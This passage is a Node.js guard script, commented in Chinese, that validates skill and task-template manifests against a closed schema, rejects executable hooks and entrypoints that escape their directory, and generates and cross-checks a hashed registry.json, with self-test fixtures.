#!/usr/bin/env node
/**
 * S6 §6-3：模板/Skill 的**分发契约**守卫（清单 + 生成式 registry + 双向比对）。
 *
 * ## 它是什么
 *
 * 三件事，一个脚本：
 *   ① **校验**每个技能目录的 `manifest.json`（严格 schema：未知键即失败）；
 *   ② **生成**`docs/skills/registry.json`（由清单派生，含内容哈希）；
 *   ③ **双向比对**提交副本与生成物（缺登记 / 幽灵条目 / 内容不一致）。
 *
 * ## 它不是什么（**刻意不做**，见 S6 §5-4「不做插件系统」）
 *
 *   · **清单不携带可执行 hook**：manifest 的键是**封闭集合**，多一个 `hook` /
 *     `command` / `script` 就是「未知键」⇒ 红。这是**纪律**而不是功能缺失：
 *     一旦清单能携带可执行片段，它就成了「被导入即被执行」的通道，而第三方扩展
 *     的定位恰恰是「只能提交**声明式产物**，由中台校验、导入、落库、审计」。
 *     技能的可执行部分永远是**独立的文件**（entrypoints 指向目录内的文件），
 *     由执行器/脚本自己决定怎么跑，清单只声明「有哪些入口、参数是什么」。
 *   · **不做目录自动遍历装载**：清单不是插件注册表；中台不会因为多了一个目录
 *     就多出一条运行期能力（那才是插件系统的入口）。
 *   · **不做热插拔**：清单是**入库前的契约**，变更走 review + 守卫 + 生成物。
 *
 * ## 为什么照抄 SOP 的纪律（而不是发明新东西）
 *
 * SOP front-matter（`apps/admin-api/src/modules/sop/sop-frontmatter.ts`）已经是本仓
 * 机器契约的既有纪律：**未知键即失败**（`validateFrontMatter` 的 `allowedTop`
 * 白名单）+ **内容哈希**（`sopContentHash` 的稳定序列化 + sha256）。本脚本把同一
 * 套纪律搬到模板/Skill 侧：
 *   · 未知键 → 红（不是警告、不是忽略）；
 *   · registry 每条带 `contentHash`（sha256 of stable(manifest)），清单改一个
 *     字符 ⇒ registry 失配 ⇒ 红 ⇒ `--write` 重新生成。
 *
 * ## 事实源（都只有一个）
 *
 *   · 能力域四值（browser|gui|filesystem|http）**从 SOP 源文件文本抽取**——不抄
 *     副本（抄本与本体各自演化 = 假绿的经典形态，见 `scripts/lib/guard-selftest.mjs`
 *     头注）。读不到 ⇒ 结构红（不是绿）。
 *   · 官方任务模板（key/description/config）**直接加载**运行时常量
 *     `apps/admin-api/src/modules/task-template/task-template.constants.ts`
 *     （Node ≥ 22.6 的原生类型剥离；本仓 CI/本地都 pin Node 24）。这份文件**零依赖**
 *     （只 import node: 内置），所以本守卫仍是「零依赖、秒级、CI 无需 npm ci」。
 *   · 清单本身是**手工维护**的声明式产物；`--write` **只写 registry.json**，
 *     **绝不改任何 manifest.json**（修复路径是「改清单」，不是「改生成物」）。
 *
 * ## 目录规则
 *
 *   docs/skills/<skillDir>/manifest.json          技能清单（name == <skillDir>）
 *   docs/skills/templates/<key>/manifest.json      任务模板清单（name == <key>）
 *   docs/skills/registry.json                      **生成物**（由上面两者派生）
 *
 *   `templates/` 是**容器**（不是技能目录）；其余子目录一律按技能目录对待，
 *   必须带 `manifest.json`。
 *
 * ## entrypoints 的越界判据
 *
 *   路径先 canonicalize（`path.resolve`），再要求**位于本目录之内**
 *   （`startsWith(dir + sep)`）——这是 claw-code 的教训（`plugins/src/lib.rs` 的
 *   `validate_command_path` 对裸命令直接放行）：`../../evil.py`、绝对路径、
 *   符号链接指向目录外，一律拒绝。清单是**分发物**，指向目录外的文件等于让
 *   导入方自己去猜该读哪儿——那是把校验责任推给了不可控的一侧。
 *
 * ## 退出码
 *
 *   0 = 全绿；1 = 有红（契约违反 / 结构红）；2 = 用法错误。
 *
 * ## 用法
 *
 *   node scripts/check-template-manifest.mjs            # 校验 + 双向比对
 *   node scripts/check-template-manifest.mjs --write    # 重新生成 registry.json
 *   node scripts/check-template-manifest.mjs --selftest # 自检（真子进程 + fixture）
 *   node scripts/check-template-manifest.mjs --root <dir>  # 只给 selftest 用
 */

import { createHash } from "node:crypto";
import {
  existsSync,
  lstatSync,
  mkdirSync,
  readFileSync,
  readdirSync,
  realpathSync,
  renameSync,
  rmSync,
  statSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { dirname, isAbsolute, join, relative, resolve } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";

import {
  expectExit,
  makeFixtureRepo,
  reportCases,
  runGuard,
} from "./lib/guard-selftest.mjs";

const SELF = fileURLToPath(import.meta.url);
const REPO_ROOT = resolve(dirname(SELF), "..");

/** 技能根目录（相对仓库根）。 */
const SKILLS_REL = "docs/skills";
/** 任务模板子目录（技能根下的**容器**，不是技能目录）。 */
const TEMPLATES_DIRNAME = "templates";
/** 生成的 registry（相对仓库根）。 */
const REGISTRY_REL = "docs/skills/registry.json";
/** 能力域事实源（SOP front-matter）。 */
const SOP_CAPS_REL = "apps/admin-api/src/modules/sop/sop-frontmatter.ts";
/** 官方任务模板事实源（运行时常量）。 */
const OFFICIAL_TPL_REL =
  "apps/admin-api/src/modules/task-template/task-template.constants.ts";

const MANIFEST_FILE = "manifest.json";

/**
 * manifest 的**封闭键集合**。
 *
 * 为什么要封闭：清单是机器契约（会被 import 落库），自由字段会让「机器能读懂」
 * 与「人以为机器能读懂」分叉——这正是 SOP front-matter 拒绝未知键的理由。
 * 「清单不携带可执行 hook」在这里是**结构性**的：hook/command/script 不是白名单
 * 键，所以写进去就是未知键 ⇒ 红。
 */
const ALLOWED_MANIFEST_KEYS = [
  "name",
  "version",
  "description",
  "capabilities",
  "params",
  "entrypoints",
];

/** params 项允许的键（照 claude-code `userConfig` 的 type/required/default/options + title/description）。 */
const ALLOWED_PARAM_KEYS = [
  "type",
  "title",
  "description",
  "required",
  "default",
  "options",
];

/** 参数类型值域。 */
const PARAM_TYPES = ["string", "number", "boolean"];

/** name 的形状（与任务模板 key 的 DB 约束 `[a-z0-9][a-z0-9_-]*` 对齐）。 */
const NAME_RE = /^[a-z0-9][a-z0-9._-]{0,63}$/;

/** version：语义化版本（带可选预发布/构建号）。 */
const VERSION_RE = /^\d+\.\d+\.\d+(?:-[0-9A-Za-z.-]+)?(?:\+[0-9A-Za-z.-]+)?$/;

// ── 通用小工具 ────────────────────────────────────────────────────────

function isPlainObject(v) {
  return typeof v === "object" && v !== null && !Array.isArray(v);
}

/** 稳定序列化（键递归排序）——内容哈希的前提，与 SOP 的 `stableStringify` 同款。 */
export function stableStringify(value) {
  if (value === null || typeof value !== "object") return JSON.stringify(value);
  if (Array.isArray(value)) {
    return `[${value.map(stableStringify).join(",")}]`;
  }
  const entries = Object.entries(value)
    .filter(([, v]) => v !== undefined)
    .sort(([a], [b]) => (a < b ? -1 : a > b ? 1 : 0));
  return `{${entries
    .map(([k, v]) => `${JSON.stringify(k)}:${stableStringify(v)}`)
    .join(",")}}`;
}

/** sha256(stable(x))——registry 每条的「内容锚」。 */
export function contentHash(value) {
  return createHash("sha256").update(stableStringify(value)).digest("hex");
}

function readText(abs) {
  try {
    return readFileSync(abs, "utf8");
  } catch {
    return null;
  }
}

function readJson(abs) {
  const text = readText(abs);
  if (text === null) return { ok: false, error: "读不到文件" };
  try {
    return { ok: true, value: JSON.parse(text) };
  } catch (err) {
    return { ok: false, error: `不是合法 JSON：${err.message}` };
  }
}

// ── 事实源 ①：SOP 能力域四值（文本抽取，不抄副本）──────────────────────

/**
 * 从 SOP 源文件里抽出 `SOP_CAPABILITIES` 的值集合。
 *
 * 为什么用**文本抽取**而不是 import：sop-frontmatter.ts 依赖 `js-yaml`，而本守卫
 * 必须**零依赖**（CI 的零依赖守卫 job 不跑 `npm ci`）。抄一份四值到本文件则是
 * 「抄本与本体各自演化」——SOP 加第五个能力域时本守卫不会知道。
 *
 * 抽取失败（文件不在 / 写法变了）⇒ **结构红**：宁可红，也不要在能力域漂移时绿。
 */
export function extractSopCapabilities(root) {
  const abs = join(root, SOP_CAPS_REL);
  const text = readText(abs);
  if (text === null) {
    return {
      error: `读不到 SOP 能力域事实源：${SOP_CAPS_REL}（能力域四值只有一个事实源，本守卫不抄副本）`,
    };
  }
  const m = /export const SOP_CAPABILITIES\s*=\s*\[([\s\S]*?)\]/.exec(text);
  if (!m) {
    return {
      error: `读不到 SOP 能力域事实源：${SOP_CAPS_REL} 里找不到 SOP_CAPABILITIES 声明（写法变了？结构红，不当绿）`,
    };
  }
  const values = [...m[1].matchAll(/["']([^"']+)["']/g)].map((x) => x[1]);
  if (values.length === 0) {
    return {
      error: `SOP 能力域事实源提取到 0 个值：${SOP_CAPS_REL}（提取器失效，结构红，不当绿）`,
    };
  }
  return { values };
}

// ── 事实源 ②：官方任务模板（直接加载运行时常量）────────────────────────

/**
 * 加载 `OFFICIAL_TASK_TEMPLATES`（运行时唯一事实源）。
 *
 * 直接 import TS 源文件而不是文本抽取：这份常量文件**零依赖**（只用 node: 内置
 * 与 String.raw），Node ≥ 22.6 的原生类型剥离可直接加载（Node 24 默认开启，
 * 本仓 CI/本地都 pin 24）。抽取器一旦失效（模板改成从别处 import）就会红，
 * 而 import 失败也是红——两者都不会静默给出「空模板集」。
 */
export async function loadOfficialTemplates(root) {
  const abs = join(root, OFFICIAL_TPL_REL);
  if (!existsSync(abs)) {
    return {
      error: `读不到官方模板事实源：${OFFICIAL_TPL_REL}（模板 key 集合只有一个事实源）`,
    };
  }
  if (!process.features?.typescript) {
    return {
      error:
        `当前 Node 不支持原生类型剥离（需 ≥ 22.6，本仓 pin 24），无法加载 ${OFFICIAL_TPL_REL}`,
    };
  }
  // 定向屏蔽 MODULE_TYPELESS_PACKAGE_JSON 警告（admin-api 的 package.json 没有
  // "type": "module"，Node 会对 TS 文件打这条噪声警告）。
  const original = process.emitWarning;
  process.emitWarning = (warning, ...rest) => {
    const code = warning && typeof warning === "object" ? warning.code : undefined;
    if (code === "MODULE_TYPELESS_PACKAGE_JSON") return;
    return original.call(process, warning, ...rest);
  };
  let mod;
  try {
    mod = await import(pathToFileURL(abs).href);
  } catch (err) {
    return {
      error: `加载官方模板事实源失败：${OFFICIAL_TPL_REL} → ${err.message}`,
    };
  } finally {
    process.emitWarning = original;
  }
  const list = mod?.OFFICIAL_TASK_TEMPLATES;
  if (!Array.isArray(list) || list.length === 0) {
    return {
      error: `官方模板事实源提取到 0 条模板：${OFFICIAL_TPL_REL}（提取器失效，结构红，不当绿）`,
    };
  }
  const out = [];
  for (const t of list) {
    if (!isPlainObject(t) || typeof t.key !== "string" || t.key === "") {
      return {
        error: `官方模板事实源里有条目缺 key：${OFFICIAL_TPL_REL}（结构红，不当绿）`,
      };
    }
    out.push({
      key: t.key,
      name: typeof t.name === "string" ? t.name : "",
      description: typeof t.description === "string" ? t.description : "",
      config: isPlainObject(t.config) ? t.config : {},
    });
  }
  return { templates: out };
}

/**
 * 从模板 config 的 glue 源码里抽「读到的参数名」。
 *
 * 用途：**双向比对模板清单与官方模板**——清单声明的 params 键集合必须等于胶水
 * 脚本实际读取的键集合。改了胶水却没改清单（或反之）⇒ 红。
 *
 * 只认三种**显式**读法（`paramValue('x')` / `param_value(params, 'x')` /
 * `params.x` / `params['x']`）：不认 `AUTOFLOW_*` 环境变量通道（那是**注入通道**，
 * 不是键名清单；`AUTOFLOW_PARAMS_JSON` 这类常量会被误当成参数名）。
 */
export function extractTemplateParamNames(config) {
  const source = typeof config?.glueSource === "string" ? config.glueSource : "";
  const names = new Set();
  const push = (v) => {
    if (typeof v === "string" && v !== "") names.add(v);
  };
  for (const m of source.matchAll(/paramValue\(\s*["']([A-Za-z0-9_]+)["']\s*\)/g)) {
    push(m[1]);
  }
  for (const m of source.matchAll(
    /param_value\(\s*params\s*,\s*["']([A-Za-z0-9_]+)["']\s*\)/g,
  )) {
    push(m[1]);
  }
  for (const m of source.matchAll(/params\.([A-Za-z0-9_]+)/g)) push(m[1]);
  for (const m of source.matchAll(/params\[\s*["']([A-Za-z0-9_]+)["']\s*\]/g)) {
    push(m[1]);
  }
  return [...names].sort();
}

// ── 清单校验（严格 schema：未知键即失败）───────────────────────────────

/**
 * 校验并归一化一份清单。
 *
 * @param {object} p
 * @param {unknown} p.raw            解析后的 JSON
 * @param {string} p.dirName         所在目录名（name 必须逐字等于它）
 * @param {string} p.dirAbs          所在目录绝对路径（entrypoints 的越界判据）
 * @param {string[]} p.capabilities  能力域值域
 * @param {string[]} p.errors        错误收集器
 * @param {string} p.where           报错位置前缀
 * @param {boolean} p.requireEntrypoints  技能清单必须给入口；模板清单允许空
 * @returns {object|null} 归一化后的清单（失败即 null）
 */
export function validateManifest({
  raw,
  dirName,
  dirAbs,
  capabilities,
  errors,
  where,
  requireEntrypoints,
}) {
  const fail = (msg) => errors.push(`${where}：${msg}`);

  if (!isPlainObject(raw)) {
    fail("清单顶层必须是 JSON 对象");
    return null;
  }
  // ① 未知键即失败（封闭集合）
  for (const key of Object.keys(raw)) {
    if (!ALLOWED_MANIFEST_KEYS.includes(key)) {
      fail(
        `未知键 manifest.${key}（清单是机器契约，不接受自由字段；` +
          `也不接受可执行 hook/command/script 这类片段——那是未登记的键）`,
      );
    }
  }

  // ② name == 目录名
  const name = raw.name;
  if (typeof name !== "string" || name.trim() === "") {
    fail("name 必须是非空字符串");
  } else {
    if (!NAME_RE.test(name)) {
      fail(`name「${name}」形状非法（只允许 [a-z0-9][a-z0-9._-]，≤64 字符）`);
    }
    if (name !== dirName) {
      fail(
        `name「${name}」必须逐字等于目录名「${dirName}」（` +
          `改名或改 name 二者必须同时做，否则清单指向的目录不存在）`,
      );
    }
  }

  // ③ version
  const version = raw.version;
  if (typeof version !== "string" || !VERSION_RE.test(version)) {
    fail(`version「${String(version)}」必须是语义化版本（x.y.z）`);
  }

  // ④ description
  const description = raw.description;
  if (typeof description !== "string" || description.trim() === "") {
    fail("description 必须是非空字符串");
  } else if (description.length > 500) {
    fail(`description 超过 500 字符（${description.length}）`);
  }

  // ⑤ capabilities（复用 SOP 四值域）
  let caps = [];
  if (!Array.isArray(raw.capabilities)) {
    fail("capabilities 必须是数组");
  } else {
    caps = raw.capabilities.slice();
    for (const c of caps) {
      if (!capabilities.includes(String(c))) {
        fail(
          `capabilities 含「${String(c)}」，不在能力域枚举内（${capabilities.join("/")}）`,
        );
      }
    }
    if (new Set(caps).size !== caps.length) fail("capabilities 有重复项");
  }

  // ⑥ params（照 userConfig 的 type/required/default/options）
  const params = {};
  if (!isPlainObject(raw.params)) {
    fail("params 必须是对象");
  } else {
    for (const [pkey, pval] of Object.entries(raw.params)) {
      const at = `manifest.params.${pkey}`;
      if (!isPlainObject(pval)) {
        fail(`${at} 必须是对象`);
        continue;
      }
      for (const k of Object.keys(pval)) {
        if (!ALLOWED_PARAM_KEYS.includes(k)) {
          fail(
            `未知键 ${at}.${k}（参数声明是机器契约，不接受自由字段；` +
              `也不接受 hook/command 这类可执行片段）`,
          );
        }
      }
      const type = pval.type;
      if (!PARAM_TYPES.includes(String(type))) {
        fail(`${at}.type 必须是 ${PARAM_TYPES.join("/")}`);
      }
      if (pval.required !== undefined && typeof pval.required !== "boolean") {
        fail(`${at}.required 必须是布尔值`);
      }
      if (pval.title !== undefined && typeof pval.title !== "string") {
        fail(`${at}.title 必须是字符串`);
      }
      if (pval.description !== undefined && typeof pval.description !== "string") {
        fail(`${at}.description 必须是字符串`);
      }
      if (pval.default !== undefined) {
        const d = pval.default;
        const ok =
          (type === "string" && typeof d === "string") ||
          (type === "number" && typeof d === "number" && Number.isFinite(d)) ||
          (type === "boolean" && typeof d === "boolean");
        if (!ok) fail(`${at}.default 的类型必须是 ${String(type)}`);
      }
      if (pval.options !== undefined) {
        if (!Array.isArray(pval.options) || pval.options.length === 0) {
          fail(`${at}.options 必须是非空数组`);
        } else {
          for (const o of pval.options) {
            if (!["string", "number", "boolean"].includes(typeof o)) {
              fail(`${at}.options 的成员只能是 string/number/boolean`);
              break;
            }
          }
          if (
            pval.default !== undefined &&
            !pval.options.some((o) => o === pval.default)
          ) {
            fail(`${at}.default 必须出现在 options 里`);
          }
        }
      }
      params[pkey] = pval;
    }
  }

  // ⑦ entrypoints（canonicalize 后必须在本目录内）
  const entrypoints = [];
  if (!Array.isArray(raw.entrypoints)) {
    fail("entrypoints 必须是数组");
  } else {
    for (const [i, ep] of raw.entrypoints.entries()) {
      const at = `manifest.entrypoints[${i}]`;
      if (typeof ep !== "string" || ep.trim() === "") {
        fail(`${at} 必须是非空字符串`);
        continue;
      }
      if (ep.includes("\0")) {
        fail(`${at} 含空字节`);
        continue;
      }
      if (isAbsolute(ep)) {
        fail(`${at}「${ep}」是绝对路径：entrypoint 必须相对本技能目录`);
        continue;
      }
      const abs = resolve(dirAbs, ep);
      const rel = relative(dirAbs, abs);
      if (rel === "" || rel.startsWith("..") || isAbsolute(rel)) {
        fail(
          `${at}「${ep}」越界：canonicalize 后落在本目录之外（${abs}）`,
        );
        continue;
      }
      // 符号链接也必须留在本目录内（词法 resolve **不**解 symlink）。
      // 实施方自报：该判据只做 `path.resolve` + `startsWith`，所以目录内一个
      // 指向目录外的 symlink 能溜过去。当前仓内没有 symlink 型 entrypoint，
      // 但「清单可能来自第三方」是这份契约的既定方向 ⇒ 现在补上，别等出事。
      // 判据用 `realpathSync`：它解析**全部**中间 symlink，若目标尚不存在
      // （后续的「不存在」判据会报），退化为词法判据即可。
      let realAbs = abs;
      try {
        realAbs = realpathSync(abs);
      } catch {
        // 目标不存在 ⇒ 交给下一条「不存在或不是普通文件」判据处理
      }
      const realRel = relative(realpathSync(dirAbs), realAbs);
      if (realRel === "" || realRel.startsWith("..") || isAbsolute(realRel)) {
        fail(
          `${at}「${ep}」越界：解析符号链接后落在本目录之外（${realAbs}）`,
        );
        continue;
      }
      if (!existsSync(abs) || !statSync(abs).isFile()) {
        fail(`${at}「${ep}」不存在或不是普通文件（${abs}）`);
        continue;
      }
      entrypoints.push(ep);
    }
    if (requireEntrypoints && entrypoints.length === 0) {
      fail("entrypoints 至少要有一个（技能必须声明自己的入口文件）");
    }
  }

  return {
    name: typeof name === "string" ? name : dirName,
    version: typeof version === "string" ? version : "",
    description: typeof description === "string" ? description : "",
    capabilities: caps,
    params,
    entrypoints,
  };
}

// ── 收集：技能清单 + 模板清单 ─────────────────────────────────────────

function listDirs(abs) {
  try {
    return readdirSync(abs, { withFileTypes: true })
      .filter((e) => e.isDirectory())
      .map((e) => e.name)
      .sort();
  } catch {
    return null;
  }
}

/**
 * 扫描技能根目录，收集技能清单与任务模板清单。
 *
 * @returns {{skills: object[], templates: object[], errors: string[]}}
 */
export function collectManifests(root, capabilities, officialTemplates) {
  const errors = [];
  const skills = [];
  const templates = [];
  const skillsAbs = join(root, SKILLS_REL);

  const dirNames = listDirs(skillsAbs);
  if (dirNames === null) {
    errors.push(
      `读不到技能目录：${SKILLS_REL}（目录不在 = 结构红，不是绿）`,
    );
    return { skills, templates, errors };
  }

  const skillDirs = dirNames.filter((n) => n !== TEMPLATES_DIRNAME);
  const templateDirs = listDirs(join(skillsAbs, TEMPLATES_DIRNAME)) ?? [];

  // ── 技能目录 ──
  for (const dirName of skillDirs) {
    const dirAbs = join(skillsAbs, dirName);
    const manifestAbs = join(dirAbs, MANIFEST_FILE);
    if (!existsSync(manifestAbs)) {
      errors.push(
        `${SKILLS_REL}/${dirName}：缺 ${MANIFEST_FILE}（技能目录必须带清单）`,
      );
      continue;
    }
    const parsed = readJson(manifestAbs);
    if (!parsed.ok) {
      errors.push(`${SKILLS_REL}/${dirName}/${MANIFEST_FILE}：${parsed.error}`);
      continue;
    }
    const before = errors.length;
    const normalized = validateManifest({
      raw: parsed.value,
      dirName,
      dirAbs,
      capabilities,
      errors,
      where: `${SKILLS_REL}/${dirName}/${MANIFEST_FILE}`,
      requireEntrypoints: true,
    });
    if (errors.length !== before || !normalized) continue;
    skills.push({
      kind: "skill",
      dir: `${SKILLS_REL}/${dirName}`,
      manifest: normalized,
    });
  }

  // ── 任务模板目录 ──
  const officialByKey = new Map(officialTemplates.map((t) => [t.key, t]));
  for (const dirName of templateDirs) {
    const dirAbs = join(skillsAbs, TEMPLATES_DIRNAME, dirName);
    const manifestAbs = join(dirAbs, MANIFEST_FILE);
    if (!existsSync(manifestAbs)) {
      errors.push(
        `${SKILLS_REL}/${TEMPLATES_DIRNAME}/${dirName}：缺 ${MANIFEST_FILE}（模板目录必须带清单）`,
      );
      continue;
    }
    const parsed = readJson(manifestAbs);
    if (!parsed.ok) {
      errors.push(
        `${SKILLS_REL}/${TEMPLATES_DIRNAME}/${dirName}/${MANIFEST_FILE}：${parsed.error}`,
      );
      continue;
    }
    const before = errors.length;
    const normalized = validateManifest({
      raw: parsed.value,
      dirName,
      dirAbs,
      capabilities,
      errors,
      where: `${SKILLS_REL}/${TEMPLATES_DIRNAME}/${dirName}/${MANIFEST_FILE}`,
      // 模板的入口在 DB config 里（entrypoint / glueSource），清单不重复承载，
      // 所以允许为空数组（字段形状与技能一致）。
      requireEntrypoints: false,
    });
    if (errors.length !== before || !normalized) continue;

    // 双向比对：清单 vs 官方模板常量
    const official = officialByKey.get(dirName);
    if (!official) {
      errors.push(
        `${SKILLS_REL}/${TEMPLATES_DIRNAME}/${dirName}：幽灵条目——` +
          `官方模板里没有 key「${dirName}」（官方 key：${[...officialByKey.keys()].join("/")}）`,
      );
      continue;
    }
    if (normalized.description !== official.description) {
      errors.push(
        `${SKILLS_REL}/${TEMPLATES_DIRNAME}/${dirName}：description 与官方模板不一致` +
          `（清单必须逐字等于 ${OFFICIAL_TPL_REL} 里的模板描述）`,
      );
    }
    const glueParams = extractTemplateParamNames(official.config);
    const manifestParams = Object.keys(normalized.params).sort();
    if (glueParams.join(",") !== manifestParams.join(",")) {
      errors.push(
        `${SKILLS_REL}/${TEMPLATES_DIRNAME}/${dirName}：params 键集合与官方模板的胶水脚本不一致` +
          `（脚本读到 ${glueParams.join("/") || "（无）"}，清单声明 ${manifestParams.join("/") || "（无）"}）`,
      );
    }
    templates.push({
      kind: "template",
      dir: `${SKILLS_REL}/${TEMPLATES_DIRNAME}/${dirName}`,
      manifest: normalized,
    });
  }

  // 反向：官方模板每个 key 都必须在清单里（缺登记）
  for (const t of officialTemplates) {
    if (!templateDirs.includes(t.key)) {
      errors.push(
        `${SKILLS_REL}/${TEMPLATES_DIRNAME}：官方模板「${t.key}」缺登记（缺 ${MANIFEST_FILE}）`,
      );
    }
  }

  return { skills, templates, errors };
}

// ── registry：生成 + 双向比对 ─────────────────────────────────────────

/** 由清单派生 registry（确定性排序，便于 diff）。 */
export function buildRegistry({ skills, templates }) {
  const row = (entry) => {
    const m = entry.manifest;
    return {
      name: m.name,
      path: entry.dir,
      version: m.version,
      description: m.description,
      capabilities: m.capabilities,
      params: m.params,
      entrypoints: m.entrypoints,
      contentHash: contentHash(m),
    };
  };
  return {
    version: 1,
    generatedBy: "scripts/check-template-manifest.mjs",
    note:
      "生成物：由 docs/skills/**/manifest.json 派生。改清单后跑 " +
      "node scripts/check-template-manifest.mjs --write 重新生成（--write 绝不改 manifest.json）。",
    skills: skills.map(row).sort((a, b) => (a.name < b.name ? -1 : a.name > b.name ? 1 : 0)),
    templates: templates
      .map(row)
      .sort((a, b) => (a.name < b.name ? -1 : a.name > b.name ? 1 : 0)),
  };
}

/**
 * 双向比对：提交副本 vs 生成物。
 *
 * 三个方向都要报（照抄 awesome-llm-apps `registry_lint.py` 的口径）：
 *   · 缺登记（生成物有、提交副本没有）；
 *   · 幽灵条目（提交副本有、生成物没有）；
 *   · 内容不一致（两边都有但内容/hash 不同）。
 */
export function compareRegistry(committed, generated, errors) {
  if (!isPlainObject(committed)) {
    errors.push(`${REGISTRY_REL}：必须是 JSON 对象`);
    return;
  }
  for (const section of ["skills", "templates"]) {
    const c = committed[section];
    const g = generated[section];
    if (!Array.isArray(c)) {
      errors.push(`${REGISTRY_REL}：缺 ${section} 数组`);
      continue;
    }
    const cByName = new Map();
    for (const row of c) {
      if (!isPlainObject(row) || typeof row.name !== "string") {
        errors.push(`${REGISTRY_REL}：${section} 里有条目缺 name`);
        continue;
      }
      cByName.set(row.name, row);
    }
    const gByName = new Map(g.map((row) => [row.name, row]));
    for (const [name, row] of gByName) {
      const got = cByName.get(name);
      if (!got) {
        errors.push(
          `${REGISTRY_REL}：缺登记——${section} 里的「${name}」没有登记（跑 --write 重新生成）`,
        );
        continue;
      }
      if (stableStringify(got) !== stableStringify(row)) {
        errors.push(
          `${REGISTRY_REL}：内容不一致——${section} 里的「${name}」与清单派生结果不同` +
            `（跑 --write 重新生成）`,
        );
      }
    }
    for (const name of cByName.keys()) {
      if (!gByName.has(name)) {
        errors.push(
          `${REGISTRY_REL}：幽灵条目——${section} 里的「${name}」没有对应的清单`,
        );
      }
    }
  }
}

// ── 主流程 ────────────────────────────────────────────────────────────

/**
 * 跑一轮校验。
 *
 * @param {string} root 仓库根
 * @param {{write?: boolean}} opts
 */
export async function runCheck(root, opts = {}) {
  const errors = [];
  const warnings = [];

  const caps = extractSopCapabilities(root);
  if (caps.error) {
    errors.push(caps.error);
    return { errors, warnings, written: false, registryPath: null };
  }
  const official = await loadOfficialTemplates(root);
  if (official.error) {
    errors.push(official.error);
    return { errors, warnings, written: false, registryPath: null };
  }

  const { skills, templates, errors: collectErrors } = collectManifests(
    root,
    caps.values,
    official.templates,
  );
  errors.push(...collectErrors);

  const generated = buildRegistry({ skills, templates });
  const registryAbs = join(root, REGISTRY_REL);
  const registryText = readText(registryAbs);

  let written = false;
  if (opts.write) {
    // --write **只**写 registry.json（生成物）。绝不改任何 manifest.json。
    //
    // 但**清单本身有错时不写**：--write 的职责是「把生成物补成与清单一致」，
    // 不是「把一份坏清单固化成生成物」。清单坏了 ⇒ 生成物必然与清单一致
    // （一致的是坏内容）⇒ 那正是「--write 掩盖问题」的经典形态。所以清单级
    // 错误一律先红，且**不落盘**。
    if (collectErrors.length > 0) {
      errors.push(
        "--write 拒绝落盘：清单本身有错（见上）。--write 只负责把生成物补成" +
          "与清单一致，不会替你修清单。",
      );
    } else {
      const next = `${JSON.stringify(generated, null, 2)}\n`;
      if (registryText !== next) {
        writeFileSync(registryAbs, next, "utf8");
        written = true;
      }
    }
  } else {
    if (registryText === null) {
      errors.push(
        `${REGISTRY_REL}：读不到（跑 node scripts/check-template-manifest.mjs --write 生成）`,
      );
    } else {
      const parsed = readJson(registryAbs);
      if (!parsed.ok) {
        errors.push(`${REGISTRY_REL}：${parsed.error}`);
      } else {
        compareRegistry(parsed.value, generated, errors);
      }
    }
  }

  return { errors, warnings, written, registryPath: registryAbs, generated };
}

function printReport(result, { root }) {
  for (const e of result.errors) console.error(`  ERROR: ${e}`);
  for (const w of result.warnings) console.warn(`  WARN:  ${w}`);
  const verdict = result.errors.length === 0 ? "PASS" : "FAIL";
  console.log(
    `  ${verdict} — ${result.errors.length} error(s), ${result.warnings.length} warning(s)`,
  );
  if (result.written) {
    console.log(`  Wrote ${REGISTRY_REL}（生成物；manifest.json 未被修改）`);
  }
}

function usageError(message) {
  process.stderr.write(
    `${message}\n用法:\n` +
      "  node scripts/check-template-manifest.mjs [--write]\n" +
      "  node scripts/check-template-manifest.mjs --selftest\n" +
      "  node scripts/check-template-manifest.mjs --root <dir>（只给 selftest 用）\n",
  );
  process.exit(2);
}

// ── 自检 ──────────────────────────────────────────────────────────────

/**
 * 造一份最小 fixture 树：1 个技能 + 1 个模板 + 两份事实源。
 *
 * 事实源（能力域 / 官方模板）在 fixture 里是**简化副本**——它们测的是「机制」
 * （抽不到 ⇒ 红、抽到 ⇒ 用它判），真实值的一致性由「真实仓库必须绿」那条用例兜。
 */
function fixtureFiles() {
  const manifest = {
    name: "demo-skill",
    version: "1.0.0",
    description: "演示技能：一个只读文件系统的小工具。",
    capabilities: ["filesystem"],
    params: {
      targetDir: {
        type: "string",
        title: "目标目录",
        description: "要读取的目录。",
        required: true,
      },
      dryRun: {
        type: "boolean",
        title: "只读",
        required: false,
        default: true,
      },
    },
    entrypoints: ["run.sh"],
  };
  const templateManifest = {
    name: "demo_template",
    version: "1.0.0",
    description: "官方演示模板的描述。",
    capabilities: ["http"],
    params: {
      url: {
        type: "string",
        title: "目标地址",
        required: false,
        default: "https://example.com",
      },
    },
    entrypoints: [],
  };
  return {
    "docs/skills/demo-skill/manifest.json": manifest,
    "docs/skills/demo-skill/run.sh": "#!/bin/sh\nexit 0\n",
    "docs/skills/templates/demo_template/manifest.json": templateManifest,
    "apps/admin-api/src/modules/sop/sop-frontmatter.ts":
      'export const SOP_CAPABILITIES = [\n  "browser",\n  "gui",\n  "filesystem",\n  "http",\n] as const;\n',
    "apps/admin-api/src/modules/task-template/task-template.constants.ts":
      'export const OFFICIAL_TASK_TEMPLATES = [\n  {\n    key: "demo_template",\n    name: "演示模板",\n    description: "官方演示模板的描述。",\n    category: "演示",\n    config: {\n      glueSource: "var url = paramValue(\'url\');\\n",\n    },\n  },\n];\n',
  };
}

/** fixture 的官方模板**副本**（与 fixtureFiles 里那份 constants.ts 同形）。 */
const FIXTURE_TEMPLATES = [
  {
    key: "demo_template",
    name: "演示模板",
    description: "官方演示模板的描述。",
    config: { glueSource: "var url = paramValue('url');\n" },
  },
];

/**
 * 在 fixture 树上算出「干净树应有的 registry」。
 *
 * 直接调本脚本的 `collectManifests` + `buildRegistry`——**不手抄**期望值
 * （手抄副本与被测代码各自演化 = 假绿的经典形态，见 guard-selftest 头注）。
 */
function fixtureRegistry(root) {
  const caps = extractSopCapabilities(root);
  if (caps.error) throw new Error(`fixture 能力域事实源坏了：${caps.error}`);
  const { skills, templates, errors } = collectManifests(
    root,
    caps.values,
    FIXTURE_TEMPLATES,
  );
  if (errors.length > 0) throw new Error(`fixture 不干净：${errors.join("; ")}`);
  return buildRegistry({ skills, templates });
}

/** 造一棵**完整且干净**的 fixture 树（含 registry.json）。 */
function cleanFixture() {
  const fx = makeFixtureRepo(fixtureFiles());
  const registry = fixtureRegistry(fx.dir);
  writeFileSync(
